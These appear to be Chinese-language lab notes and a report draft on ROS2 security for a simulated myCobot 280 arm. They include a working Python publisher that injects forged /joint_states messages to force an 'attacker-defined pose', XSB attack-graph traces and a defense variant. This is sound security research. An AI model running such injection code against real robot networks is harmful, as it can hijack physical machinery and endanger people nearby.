执行`ros2 launch mycobot_280 test.launch.py`

![alt text](normal.png)

执行`ros2 topic list`

```bash
what@ubuntu:~/colcon_ws$ ros2 topic list
/clicked_point
/goal_pose
/initialpose
/joint_states
/parameter_events
/robot_description
/rosout
/tf
/tf_static
```

```bash
what@ubuntu:~/colcon_ws$ ros2 topic list -t
/clicked_point [geometry_msgs/msg/PointStamped]
/goal_pose [geometry_msgs/msg/PoseStamped]
/initialpose [geometry_msgs/msg/PoseWithCovarianceStamped]
/joint_states [sensor_msgs/msg/JointState]
/parameter_events [rcl_interfaces/msg/ParameterEvent]
/robot_description [std_msgs/msg/String]
/rosout [rcl_interfaces/msg/Log]
/tf [tf2_msgs/msg/TFMessage]
/tf_static [tf2_msgs/msg/TFMessage]
what@ubuntu:~/colcon_ws$ ros2 topic type /joint_states
sensor_msgs/msg/JointState
```

```bash
what@ubuntu:~/colcon_ws$ ros2 interface show sensor_msgs/msg/JointState
# This is a message that holds data to describe the state of a set of torque controlled joints.
#
# The state of each joint (revolute or prismatic) is defined by:
#  * the position of the joint (rad or m),
#  * the velocity of the joint (rad/s or m/s) and
#  * the effort that is applied in the joint (Nm or N).
#
# Each joint is uniquely identified by its name
# The header specifies the time at which the joint states were recorded. All the joint states
# in one message have to be recorded at the same time.
#
# This message consists of a multiple arrays, one for each part of the joint state.
# The goal is to make each of the fields optional. When e.g. your joints have no
# effort associated with them, you can leave the effort array empty.
#
# All arrays in this message should have the same size, or be empty.
# This is the only way to uniquely associate the joint name with the correct
# states.

std_msgs/Header header

string[] name
float64[] position
float64[] velocity
float64[] effort
```

```bash
what@ubuntu:~/colcon_ws$ ros2 topic info /joint_states -v
Type: sensor_msgs/msg/JointState

Publisher count: 1

Node name: joint_state_publisher
Node namespace: /
Topic type: sensor_msgs/msg/JointState
Endpoint type: PUBLISHER
GID: 01.0f.ef.2a.4b.08.f0.ae.01.00.00.00.00.00.12.03.00.00.00.00.00.00.00.00
QoS profile:
  Reliability: RMW_QOS_POLICY_RELIABILITY_RELIABLE
  Durability: RMW_QOS_POLICY_DURABILITY_VOLATILE
  Lifespan: 2147483651294967295 nanoseconds
  Deadline: 2147483651294967295 nanoseconds
  Liveliness: RMW_QOS_POLICY_LIVELINESS_AUTOMATIC
  Liveliness lease duration: 2147483651294967295 nanoseconds

Subscription count: 1

Node name: robot_state_publisher
Node namespace: /
Topic type: sensor_msgs/msg/JointState
Endpoint type: SUBSCRIPTION
GID: 01.0f.ef.2a.49.08.73.5b.01.00.00.00.00.00.15.04.00.00.00.00.00.00.00.00
QoS profile:
  Reliability: RMW_QOS_POLICY_RELIABILITY_RELIABLE
  Durability: RMW_QOS_POLICY_DURABILITY_VOLATILE
  Lifespan: 2147483651294967295 nanoseconds
  Deadline: 2147483651294967295 nanoseconds
  Liveliness: RMW_QOS_POLICY_LIVELINESS_AUTOMATIC
  Liveliness lease duration: 2147483651294967295 nanoseconds
```

```bash
python3 - <<'PY'
import math
import rclpy
from rclpy.node import Node
from sensor_msgs.msg import JointState

class FakeJointStatePub(Node):
    def __init__(self):
        super().__init__('fake_joint_state_pub_continuous')
        self.pub = self.create_publisher(JointState, '/joint_states', 10)
        self.timer = self.create_timer(0.05, self.publish_msg)  # 20 Hz，更平滑
        self.t = 0.0

        self.joint_names = [
            'joint2_to_joint1',
            'joint3_to_joint2',
            'joint4_to_joint3',
            'joint5_to_joint4',
            'joint6_to_joint5',
            'joint6output_to_joint6'
        ]

        # 你的 joint 限位，单位是弧度
        self.limits = [
            (-2.9322,  2.9322),
            (-2.3562,  2.3562),
            (-2.6180,  2.6180),
            (-2.5307,  2.5307),
            (-2.8798,  2.8798),
            (-3.14159, 3.14159),
        ]

        # 留一点安全余量，不顶满极限
        self.scale = 0.85

        # 每个关节不同频率/相位，看起来更明显
        self.freqs = [0.7, 0.9, 1.1, 0.8, 1.0, 1.2]
        self.phases = [0.0, 0.8, 1.6, 2.4, 3.2, 4.0]

    def publish_msg(self):
        msg = JointState()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.name = self.joint_names

        positions = []
        for i, (low, high) in enumerate(self.limits):
            center = (low + high) / 2.0
            amplitude = (high - low) / 2.0 * self.scale
            value = center + amplitude * math.sin(2 * math.pi * self.freqs[i] * self.t + self.phases[i])
            positions.append(value)

        msg.position = positions
        msg.velocity = []
        msg.effort = []

        self.pub.publish(msg)
        self.t += 0.05

def main():
    rclpy.init()
    node = FakeJointStatePub()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    node.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
PY
```

```bash
python3 - <<'PY'
import math
import rclpy
from rclpy.node import Node
from sensor_msgs.msg import JointState

class AttackDemoPub(Node):
    def __init__(self):
        super().__init__('attack_demo_pub')
        self.pub = self.create_publisher(JointState, '/joint_states', 10)
        self.timer = self.create_timer(0.05, self.publish_msg)  # 20 Hz
        self.t = 0.0

        self.joint_names = [
            'joint2_to_joint1',
            'joint3_to_joint2',
            'joint4_to_joint3',
            'joint5_to_joint4',
            'joint6_to_joint5',
            'joint6output_to_joint6'
        ]

        self.limits = [
            (-2.9322,  2.9322),
            (-2.3562,  2.3562),
            (-2.6180,  2.6180),
            (-2.5307,  2.5307),
            (-2.8798,  2.8798),
            (-3.14159, 3.14159),
        ]

        self.safe_pose = [0.0, 0.0, 0.0, 0.0, 0.0, 0.0]
        self.end_pose  = [0.6, -1.0, 1.2, -0.8, 0.7, 0.2]

        self.scale = 0.85
        self.freqs = [0.7, 1.0, 1.3, 0.9, 1.1, 1.5]
        self.phases = [0.0, 0.9, 1.7, 2.6, 3.4, 4.2]

    def clamp(self, values):
        out = []
        for v, (low, high) in zip(values, self.limits):
            out.append(max(low, min(high, v)))
        return out

    def build_msg(self, positions):
        msg = JointState()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.name = self.joint_names
        msg.position = self.clamp(positions)
        msg.velocity = []
        msg.effort = []
        return msg

    def publish_msg(self):
        # 阶段 1：前 2 秒静止
        if self.t < 2.0:
            positions = self.safe_pose

        # 阶段 2：2~10 秒进入“异常摆动”
        elif self.t < 10.0:
            positions = []
            for i, (low, high) in enumerate(self.limits):
                center = (low + high) / 2.0
                amplitude = (high - low) / 2.0 * self.scale
                value = center + amplitude * math.sin(
                    2 * math.pi * self.freqs[i] * (self.t - 2.0) + self.phases[i]
                )
                positions.append(value)

        # 阶段 3：10~12 秒收敛到一个异常终止姿态
        elif self.t < 12.0:
            alpha = (self.t - 10.0) / 2.0
            current = []
            for i, (low, high) in enumerate(self.limits):
                center = (low + high) / 2.0
                amplitude = (high - low) / 2.0 * self.scale
                start_val = center + amplitude * math.sin(
                    2 * math.pi * self.freqs[i] * (8.0) + self.phases[i]
                )
                end_val = self.end_pose[i]
                val = (1 - alpha) * start_val + alpha * end_val
                current.append(val)
            positions = current

        # 阶段 4：12 秒后保持异常姿态
        else:
            positions = self.end_pose

        msg = self.build_msg(positions)
        self.pub.publish(msg)

        if abs((self.t * 10) % 10) < 1e-6:
            if self.t < 2.0:
                print(f"[{self.t:4.1f}s] normal idle pose")
            elif self.t < 10.0:
                print(f"[{self.t:4.1f}s] injected abnormal motion")
            elif self.t < 12.0:
                print(f"[{self.t:4.1f}s] converging to attacker-defined pose")
            else:
                print(f"[{self.t:4.1f}s] attacker-defined pose locked")

        self.t += 0.05

def main():
    rclpy.init()
    node = AttackDemoPub()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    node.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
PY
```

```bash
ros2 launch mycobot_280 test.launch.py
ros2 topic echo /joint_states
```

# 代码分析

```python
import math
import rclpy
from rclpy.node import Node
from sensor_msgs.msg import JointState

class AttackDemoPub(Node):
    def __init__(self):
        super().__init__('attack_demo_pub')
        self.pub = self.create_publisher(JointState, '/joint_states', 10)
        self.timer = self.create_timer(0.05, self.publish_msg)  # 20 Hz
        self.t = 0.0

        self.joint_names = [
            'joint2_to_joint1',
            'joint3_to_joint2',
            'joint4_to_joint3',
            'joint5_to_joint4',
            'joint6_to_joint5',
            'joint6output_to_joint6'
        ]

        self.limits = [
            (-2.9322,  2.9322),
            (-2.3562,  2.3562),
            (-2.6180,  2.6180),
            (-2.5307,  2.5307),
            (-2.8798,  2.8798),
            (-3.14159, 3.14159),
        ]

        self.safe_pose = [0.0, 0.0, 0.0, 0.0, 0.0, 0.0]
        self.end_pose  = [0.6, -1.0, 1.2, -0.8, 0.7, 0.2]

        self.scale = 0.85
        self.freqs = [0.7, 1.0, 1.3, 0.9, 1.1, 1.5]
        self.phases = [0.0, 0.9, 1.7, 2.6, 3.4, 4.2]

    def clamp(self, values):
        out = []
        for v, (low, high) in zip(values, self.limits):
            out.append(max(low, min(high, v)))
        return out

    def build_msg(self, positions):
        msg = JointState()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.name = self.joint_names
        msg.position = self.clamp(positions)
        msg.velocity = []
        msg.effort = []
        return msg

    def publish_msg(self):
        # 阶段 1：前 2 秒静止
        if self.t < 2.0:
            positions = self.safe_pose

        # 阶段 2：2~10 秒进入“异常摆动”
        elif self.t < 10.0:
            positions = []
            for i, (low, high) in enumerate(self.limits):
                center = (low + high) / 2.0
                amplitude = (high - low) / 2.0 * self.scale
                value = center + amplitude * math.sin(
                    2 * math.pi * self.freqs[i] * (self.t - 2.0) + self.phases[i]
                )
                positions.append(value)

        # 阶段 3：10~12 秒收敛到一个异常终止姿态
        elif self.t < 12.0:
            alpha = (self.t - 10.0) / 2.0
            current = []
            for i, (low, high) in enumerate(self.limits):
                center = (low + high) / 2.0
                amplitude = (high - low) / 2.0 * self.scale
                start_val = center + amplitude * math.sin(
                    2 * math.pi * self.freqs[i] * (8.0) + self.phases[i]
                )
                end_val = self.end_pose[i]
                val = (1 - alpha) * start_val + alpha * end_val
                current.append(val)
            positions = current

        # 阶段 4：12 秒后保持异常姿态
        else:
            positions = self.end_pose

        msg = self.build_msg(positions)
        self.pub.publish(msg)

        if abs((self.t * 10) % 10) < 1e-6:
            if self.t < 2.0:
                print(f"[{self.t:4.1f}s] normal idle pose")
            elif self.t < 10.0:
                print(f"[{self.t:4.1f}s] injected abnormal motion")
            elif self.t < 12.0:
                print(f"[{self.t:4.1f}s] converging to attacker-defined pose")
            else:
                print(f"[{self.t:4.1f}s] attacker-defined pose locked")

        self.t += 0.05

def main():
    rclpy.init()
    node = AttackDemoPub()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    node.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
```

刚刚有一个发现，上午运行这段python代码时候忘了关掉之前的GUI_publisher了，导致两个节点同时在发布/joint_states，结果就是一段时间稳定下来后（attacker-defined pose locked），模型反复在safe_pose和end_pose之间切换。这是否说明当一个正常publisher和一个攻击者publisher同时存在时，攻击者的消息会和正常信息相互竞争，导致机器人状态不稳定？我认为这是一个很脆弱的环境，因为这意味着在大量机械臂部署时，如果信号窜位或任意在这个网络里的攻击者制造一个恶意publisher，都可以“夺舍”任意的机械臂。在我的设想里难道不应该加上一个并发锁，或验证签名吗？这是否是一个攻击链路？


```bash
what@ubuntu:~/XSB/bin$ ./xsb
[xsb_configuration loaded]
[sysinitrc loaded]
[xsbbrat loaded]

XSB Version 5.0.0 (Green Tea) of May 15, 2022
[x86_64-pc-linux-gnu 64 bits; mode: optimal; engine: slg-wam; scheduling: local]
[Build date: 2025-11-28]

| ?- ['joint_attack.xsb'].
[Compiling ./joint_attack.xsb]
% Specialising partially instantiated calls to hacl/3
% Specialising partially instantiated calls to subscribes/2
% Specialising partially instantiated calls to trustsSubscriberInput/2
% Specialising partially instantiated calls to publishes/2
% Specialising partially instantiated calls to bridgeNode/1
% Specialising partially instantiated calls to forwardsToPhysicalLayer/1
% Specialising partially instantiated calls to allowAuthority/2
[./joint_attack.xsb compiled, cpu time used: 0.032 seconds]
[./joint_attack.xsb loaded]

yes
| ?- misleadPoseDisplay(attacker_host, mycobot_vm).

yes
| ?- oscillatingPoseDisplay(attacker_host, mycobot_vm).

yes
| ?- physicalLayerRisk(attacker_host, mycobot_vm).

yes
| ?- policyViolation(attacker_host, Action, Resource).

Action = publish
Resource = joint_states_topic

yes
```

```bash
| ?- spy(injectForgedJointState/3).
Spy point set on usermod:injectForgedJointState/3

yes
[debug]
| ?- spy(tamperTFStream/2).
Spy point set on usermod:tamperTFStream/2

yes
[debug]
| ?- spy(misleadPoseDisplay/2).
Spy point set on usermod:misleadPoseDisplay/2

yes
[debug]
| ?- misleadPoseDisplay(attacker_host, mycobot_vm).
** (0) Call: misleadPoseDisplay(attacker_host,mycobot_vm) ? 
** (1) Call: tamperTFStream(attacker_host,mycobot_vm) ? 
** (2) Call: injectForgedJointState(attacker_host,mycobot_vm,joint_states_topic) ? 
   (3) Call: forgeValidJointState(attacker_host,joint_states_topic) ? 
   (4) Call: learnMessageSchema(attacker_host,joint_states_topic) ? 
   (5) Call: enumerateTopic(attacker_host,_h473,joint_states_topic) ? 
   (6) Call: ros2DiscoveryEnabled(mycobot_vm) ? 
   (6) Exit: ros2DiscoveryEnabled(mycobot_vm) ? 
   (7) Call: rosTopic(mycobot_vm,joint_states_topic) ? 
   (7) Exit: rosTopic(mycobot_vm,joint_states_topic) ? 
   (5) Exit: enumerateTopic(attacker_host,mycobot_vm,joint_states_topic) ? 
   (8) Call: messageType(joint_states_topic,_h540) ? 
   (8) Exit: messageType(joint_states_topic,'sensor_msgs/msg/JointState') ? 
   (4) Exit: learnMessageSchema(attacker_host,joint_states_topic) ? 
   (9) Call: requiresValidJointNames(joint_states_topic) ? 
   (9) Exit: requiresValidJointNames(joint_states_topic) ? 
   (10) Call: requiresValidTimestamp(joint_states_topic) ? 
   (10) Exit: requiresValidTimestamp(joint_states_topic) ? 
   (11) Call: requiresJointRange(joint_states_topic) ? 
   (11) Exit: requiresJointRange(joint_states_topic) ? 
   (12) Call: jointNamesMatch(joint_states_topic) ? 
   (12) Exit: jointNamesMatch(joint_states_topic) ? 
   (13) Call: jointRangesKnown(joint_states_topic) ? 
   (13) Exit: jointRangesKnown(joint_states_topic) ? 
   (14) Call: canGenerateCurrentTimestamp(attacker_host) ? 
   (14) Exit: canGenerateCurrentTimestamp(attacker_host) ? 
   (3) Exit: forgeValidJointState(attacker_host,joint_states_topic) ? 
   (15) Call: rosTopic(mycobot_vm,joint_states_topic) ? 
   (15) Exit: rosTopic(mycobot_vm,joint_states_topic) ? 
   (16) Call: noTopicAuth(mycobot_vm,joint_states_topic) ? 
   (16) Exit: noTopicAuth(mycobot_vm,joint_states_topic) ? 
   (17) Call: noPublisherACL(mycobot_vm,joint_states_topic) ? 
   (17) Exit: noPublisherACL(mycobot_vm,joint_states_topic) ? 
** (2) Exit: injectForgedJointState(attacker_host,mycobot_vm,joint_states_topic) ? 
** (1) Exit: tamperTFStream(attacker_host,mycobot_vm) ? 
** (0) Exit: misleadPoseDisplay(attacker_host,mycobot_vm) ? 

yes
[trace]
```

这段 `spy` 输出的意义在于，它把“为什么 `misleadPoseDisplay(attacker_host, mycobot_vm)` 能成立”完整展开成了一条可追踪的推理链，而不再只是最后得到一个简单的 `yes`。

从输出可以看出，XSB 的推理顺序大致是：

1. 先尝试证明最终目标 `misleadPoseDisplay(attacker_host, mycobot_vm)`；
2. 为了证明这一点，继续去证明中间条件 `tamperTFStream(attacker_host, mycobot_vm)`；
3. 而要让 TF 流被篡改，又必须先证明攻击者已经完成 `injectForgedJointState(attacker_host, mycobot_vm, joint_states_topic)`；
4. 在注入这一步里，系统又继续向下展开，检查攻击者是否真的具备“构造合法 JointState”的条件。

其中最关键的一段是 `forgeValidJointState(attacker_host, joint_states_topic)` 的展开。这里可以清楚看到，规则并没有把“攻击者能发消息”直接等同于“攻击成立”，而是逐项检查了多个前提：

- 攻击者能否在 ROS2 域内枚举到 `/joint_states`；
- 攻击者是否知道该话题的消息类型是 `sensor_msgs/msg/JointState`；
- 是否满足合法 joint 名称要求；
- 是否满足有效时间戳要求；
- 是否满足 joint 取值范围要求；
- 攻击者是否具备生成当前时间戳的能力。

这些检查全部成功后，XSB 才让 `forgeValidJointState(...)` 退出为真，接着再判断：

- 目标 topic 是否存在；
- 系统是否缺少 topic 级认证；
- 系统是否缺少 publisher 访问控制。

当这些条件也都满足后，`injectForgedJointState(...)` 才被判定成立，随后 `tamperTFStream(...)` 和 `misleadPoseDisplay(...)` 依次成立，最后返回 `yes`。

因此，这段输出的核心说明是：

**XSB 并不是在机械地返回一个预设结论，而是在规则层面逐步验证：攻击者先能发现目标话题，再能理解消息格式，再能构造满足 joint 名称、时间戳和范围约束的合法伪造消息，最后在缺乏认证和访问控制的前提下完成注入，并最终导致 RViz 姿态显示被误导。**

这对结项报告很重要，因为它把前面实验中观察到的现象，转成了一个可解释、可复述、可追踪的逻辑推理链。


```bash
what@ubuntu:~/XSB/bin$ ./xsb
[xsb_configuration loaded, cpu time used: 0.001 seconds]
[sysinitrc loaded]
[xsbbrat loaded]

XSB Version 5.0.0 (Green Tea) of May 15, 2022
[x86_64-pc-linux-gnu 64 bits; mode: optimal; engine: slg-wam; scheduling: local]
[Build date: 2025-11-28]

| ?- ['joint_attack.xsb'].
[./joint_attack.xsb loaded, cpu time used: 0.001 seconds]

yes
| ?- spy(competingPublisherState/3).
Spy point set on usermod:competingPublisherState/3

yes
[debug]
| ?- spy(oscillatingPoseDisplay/2).
Spy point set on usermod:oscillatingPoseDisplay/2

yes
[debug]
| ?- oscillatingPoseDisplay(attacker_host, mycobot_vm).
** (0) Call: oscillatingPoseDisplay(attacker_host,mycobot_vm) ? 
** (1) Call: competingPublisherState(attacker_host,mycobot_vm,joint_states_topic) ? 
   (2) Call: legitimatePublisher(_h433,joint_states_topic) ? 
   (2) Exit: legitimatePublisher(joint_state_publisher_gui,joint_states_topic) ? 
   (3) Call: maliciousPublisher(attacker_host,joint_states_topic) ? 
   (3) Exit: maliciousPublisher(attacker_host,joint_states_topic) ? 
   (4) Call: rosTopic(mycobot_vm,joint_states_topic) ? 
   (4) Exit: rosTopic(mycobot_vm,joint_states_topic) ? 
   (5) Call: noTopicAuth(mycobot_vm,joint_states_topic) ? 
   (5) Exit: noTopicAuth(mycobot_vm,joint_states_topic) ? 
   (6) Call: noPublisherACL(mycobot_vm,joint_states_topic) ? 
   (6) Exit: noPublisherACL(mycobot_vm,joint_states_topic) ? 
** (1) Exit: competingPublisherState(attacker_host,mycobot_vm,joint_states_topic) ? 
** (0) Exit: oscillatingPoseDisplay(attacker_host,mycobot_vm) ? 

yes
[trace]
| ?- notrace.

yes
| ?- halt.

End XSB (cputime 0.03 secs, elapsetime 89.13 secs)
what@ubuntu:~/XSB/bin$ 

```

这段 `spy` 输出对应的是竞争性 publisher 场景，作用是把“为什么 `oscillatingPoseDisplay(attacker_host, mycobot_vm)` 能成立”拆成一条更短但非常关键的推理链。

从输出可以看到，XSB 在证明 `oscillatingPoseDisplay(attacker_host, mycobot_vm)` 时，核心只检查了一件事：`competingPublisherState(attacker_host, mycobot_vm, joint_states_topic)` 是否成立。也就是说，这条规则的关注点不再是“攻击者能不能构造合法 JointState”，而是“同一个关键 topic 上是否同时存在正常输入源和恶意输入源，并且系统没有做源鉴别或访问控制”。

具体来看，XSB 逐项验证了以下条件：

1. 存在一个合法 publisher，即 `joint_state_publisher_gui` 正在向 `joint_states_topic` 发布消息；
2. 存在一个恶意 publisher，即攻击者也在向同一个 `joint_states_topic` 发布消息；
3. 该 topic 确实存在于 `mycobot_vm` 中；
4. 系统没有为该 topic 提供 topic 级认证；
5. 系统没有为 publisher 提供访问控制列表（ACL）。

当这几项条件全部满足后，`competingPublisherState(...)` 被判定为真，随后 `oscillatingPoseDisplay(...)` 也成立，最终返回 `yes`。

这段输出的重要意义在于，它说明“状态振荡”并不是一个偶然现象，也不是简单的界面刷新问题，而是一个可以被规则清楚描述的系统性风险：  
**只要正常 publisher 和恶意 publisher 在同一个未受保护的 `/joint_states` 上并存，订阅方就会陷入状态竞争，进而产生姿态不稳定或来回切换的结果。**

换句话说，前一个实验更像是在证明“攻击者能不能把错误状态注入进去”，而这一段则是在证明“即使攻击者无法独占控制，只要能够持续参与同一条状态流，就足以破坏系统稳定性”。这使得竞争性 publisher 不再只是一个调试中的异常现象，而是可以被明确写入报告的扩展攻击链。


```bash
?- misleadPoseDisplay(attacker_host, mycobot_vm).
?- oscillatingPoseDisplay(attacker_host, mycobot_vm).
?- physicalLayerRisk(attacker_host, mycobot_vm).
?- policyViolation(attacker_host, Action, Resource).
?- defenseEffective(mycobot_vm, joint_states_topic).
```

```bash
['joint_attack.xsb'].
['joint_defense.xsb'].
```

```bash
python3 - <<'PY'
import math
import rclpy
from rclpy.node import Node
from sensor_msgs.msg import JointState

class FakeJointStatePub(Node):
    def __init__(self):
        super().__init__('fake_joint_state_pub_continuous')
        self.pub = self.create_publisher(JointState, '/joint_states', 10)
        self.timer = self.create_timer(0.05, self.publish_msg)  # 20 Hz，更平滑
        self.t = 0.0

        self.joint_names = [
            'joint2_to_joint1',
            'joint3_to_joint2',
            'joint4_to_joint3',
            'joint5_to_joint4',
            'joint6_to_joint5',
            'joint6output_to_joint6'
        ]

        # 你的 joint 限位，单位是弧度
        self.limits = [
            (-2.9322,  2.9322),
            (-2.3562,  2.3562),
            (-2.6180,  2.6180),
            (-2.5307,  2.5307),
            (-2.8798,  2.8798),
            (-3.14159, 3.14159),
        ]

        # 留一点安全余量，不顶满极限
        self.scale = 0.85

        # 每个关节不同频率/相位，看起来更明显
        self.freqs = [0.7, 0.9, 1.1, 0.8, 1.0, 1.2]
        self.phases = [0.0, 0.8, 1.6, 2.4, 3.2, 4.0]

    def publish_msg(self):
        msg = JointState()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.name = self.joint_names

        positions = []
        for i, (low, high) in enumerate(self.limits):
            center = (low + high) / 2.0
            amplitude = (high - low) / 2.0 * self.scale
            value = center + amplitude * math.sin(2 * math.pi * self.freqs[i] * self.t + self.phases[i])
            positions.append(value)

        msg.position = positions
        msg.velocity = []
        msg.effort = []

        self.pub.publish(msg)
        self.t += 0.05

def main():
    rclpy.init()
    node = FakeJointStatePub()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    node.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
PY
```

```bash
python3 - <<'PY'
import math
import rclpy
from rclpy.node import Node
from sensor_msgs.msg import JointState

class AttackDemoPub(Node):
    def __init__(self):
        super().__init__('attack_demo_pub')
        self.pub = self.create_publisher(JointState, '/_joint_states_authorized_source', 10)
        self.timer = self.create_timer(0.05, self.publish_msg)  # 20 Hz
        self.t = 0.0

        self.joint_names = [
            'joint2_to_joint1',
            'joint3_to_joint2',
            'joint4_to_joint3',
            'joint5_to_joint4',
            'joint6_to_joint5',
            'joint6output_to_joint6'
        ]

        self.limits = [
            (-2.9322,  2.9322),
            (-2.3562,  2.3562),
            (-2.6180,  2.6180),
            (-2.5307,  2.5307),
            (-2.8798,  2.8798),
            (-3.14159, 3.14159),
        ]

        self.safe_pose = [0.0, 0.0, 0.0, 0.0, 0.0, 0.0]
        self.end_pose  = [0.6, -1.0, 1.2, -0.8, 0.7, 0.2]

        self.scale = 0.85
        self.freqs = [0.7, 1.0, 1.3, 0.9, 1.1, 1.5]
        self.phases = [0.0, 0.9, 1.7, 2.6, 3.4, 4.2]

    def clamp(self, values):
        out = []
        for v, (low, high) in zip(values, self.limits):
            out.append(max(low, min(high, v)))
        return out

    def build_msg(self, positions):
        msg = JointState()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.name = self.joint_names
        msg.position = self.clamp(positions)
        msg.velocity = []
        msg.effort = []
        return msg

    def publish_msg(self):
        # 阶段 1：前 2 秒静止
        if self.t < 2.0:
            positions = self.safe_pose

        # 阶段 2：2~10 秒进入“异常摆动”
        elif self.t < 10.0:
            positions = []
            for i, (low, high) in enumerate(self.limits):
                center = (low + high) / 2.0
                amplitude = (high - low) / 2.0 * self.scale
                value = center + amplitude * math.sin(
                    2 * math.pi * self.freqs[i] * (self.t - 2.0) + self.phases[i]
                )
                positions.append(value)

        # 阶段 3：10~12 秒收敛到一个异常终止姿态
        elif self.t < 12.0:
            alpha = (self.t - 10.0) / 2.0
            current = []
            for i, (low, high) in enumerate(self.limits):
                center = (low + high) / 2.0
                amplitude = (high - low) / 2.0 * self.scale
                start_val = center + amplitude * math.sin(
                    2 * math.pi * self.freqs[i] * (8.0) + self.phases[i]
                )
                end_val = self.end_pose[i]
                val = (1 - alpha) * start_val + alpha * end_val
                current.append(val)
            positions = current

        # 阶段 4：12 秒后保持异常姿态
        else:
            positions = self.end_pose

        msg = self.build_msg(positions)
        self.pub.publish(msg)

        if abs((self.t * 10) % 10) < 1e-6:
            if self.t < 2.0:
                print(f"[{self.t:4.1f}s] normal idle pose")
            elif self.t < 10.0:
                print(f"[{self.t:4.1f}s] injected abnormal motion")
            elif self.t < 12.0:
                print(f"[{self.t:4.1f}s] converging to attacker-defined pose")
            else:
                print(f"[{self.t:4.1f}s] attacker-defined pose locked")

        self.t += 0.05

def main():
    rclpy.init()
    node = AttackDemoPub()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    node.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
PY
```

ros2 topic info /_joint_states_authorized_source -v
ros2 topic info /_joint_states_trusted -v